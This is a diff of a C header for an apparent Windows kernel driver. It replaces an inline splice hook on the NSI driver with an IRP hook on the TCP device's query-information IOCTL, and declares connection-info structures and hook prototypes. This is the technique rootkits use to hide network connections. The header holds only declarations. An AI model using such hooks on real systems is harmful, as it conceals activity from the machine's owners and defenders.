@@ -2,44 +2,63 @@
 #define _NET_STAT_H_
 
 #include "inc.h"
+#include <tdiinfo.h>
 
-#define SPLICING_CODE_SIZE 5
+#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003 
+//#define MAKEPORT(a, b)   ((WORD)(((UCHAR)(a))|((WORD)((UCHAR)(b))) << 8))
+#define HTONS(a)  (((0xFF&a)<<8) + ((0xFF00&a)>>8)) 
 
-PDRIVER_DISPATCH glIrpDirectoryRoutine;
+typedef struct _CONNINFO101 {
+	unsigned long status;
+	unsigned long src_addr;
+	unsigned short src_port;
+	unsigned short unk1;
+	unsigned long dst_addr;
+	unsigned short dst_port;
+	unsigned short unk2;
+} CONNINFO101, * PCONNINFO101;
 
-//for init hook
-PDRIVER_OBJECT glNsiDriverObject;
-extern POBJECT_TYPE* IoDriverObjectType;
+typedef struct _CONNINFO102 {
+	unsigned long status;
+	unsigned long src_addr;
+	unsigned short src_port;
+	unsigned short unk1;
+	unsigned long dst_addr;
+	unsigned short dst_port;
+	unsigned short unk2;
+	unsigned long pid;
+} CONNINFO102, * PCONNINFO102;
 
-BYTE glOriginalDirectoryRoutineBytes[SPLICING_CODE_SIZE];
+typedef struct _CONNINFO110 {
+	unsigned long size;
+	unsigned long status;
+	unsigned long src_addr;
+	unsigned short src_port;
+	unsigned short unk1;
+	unsigned long dst_addr;
+	unsigned short dst_port;
+	unsigned short unk2;
+	unsigned long pid;
+	PVOID    unk3[35];
+} CONNINFO110, * PCONNINFO110;
 
-__declspec(dllimport)
-NTSTATUS
-ObReferenceObjectByName(
-    IN PUNICODE_STRING  ObjectName,
-    IN ULONG            Attributes,
-    IN PACCESS_STATE    PassedAccessState OPTIONAL,
-    IN ACCESS_MASK      DesiredAccess OPTIONAL,
-    IN POBJECT_TYPE     ObjectType,
-    IN KPROCESSOR_MODE  AccessMode,
-    IN OUT PVOID        ParseContext OPTIONAL,
-    OUT PVOID* Object
-);
+typedef struct CompletionRoutineContext {
+	PIO_COMPLETION_ROUTINE  oldCompletion;
+	PVOID                   oldContext;
+	UCHAR                   oldControl;
+	unsigned long           reqType;
+} CompletionRoutineContext, * PCompletionRoutineContext;
 
-NTSTATUS NtDeviceIoControlFile(
-    IN  HANDLE           FileHandle,
-    IN  HANDLE           Event,
-    IN  PIO_APC_ROUTINE  ApcRoutine,
-    IN  PVOID            ApcContext,
-    OUT PIO_STATUS_BLOCK IoStatusBlock,
-    IN  ULONG            IoControlCode,
-    IN  PVOID            InputBuffer,
-    IN  ULONG            InputBufferLength,
-    OUT PVOID            OutputBuffer,
-    IN  ULONG            OutputBufferLength
-);
+PFILE_OBJECT pTcpFile;
+PDEVICE_OBJECT pTcpDevice;
+PDRIVER_OBJECT pTcpDriver;
 
-NTSTATUS InitHookNet(PWCHAR DriverName);
+PDRIVER_DISPATCH glRealIrpMjDeviceControl;
+
+
+
+NTSTATUS InstallTCPDriverHook(WCHAR* wcTcpDeviceNameBuffer);
+
 NTSTATUS HookTcpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
 
 #endif // !_NET_STAT_H_
